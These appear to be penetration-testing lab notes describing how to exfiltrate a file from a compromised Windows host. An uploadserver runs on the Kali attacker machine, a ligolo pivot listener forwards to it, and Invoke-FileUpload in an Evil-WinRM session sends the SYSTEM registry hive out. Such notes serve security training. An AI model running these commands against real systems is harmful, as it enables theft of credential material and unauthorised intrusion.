# Method 1  : Uploadserver

On KALI ATTACKER:

(Skip)
```
pipx install uploadserver
```

```
uploadserver
```

On Kali (Another tab where you have ligolo proxy running):
```
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000
```

On TARGET host (MS02): _Evil-WinRM_ PS C:\Users\celia.almeda\Documents>
```
Invoke-FileUpload -Uri "http://[MS01 IP]:8000/upload" -File "C:\windows.old\windows\system32\SYSTEM"
```
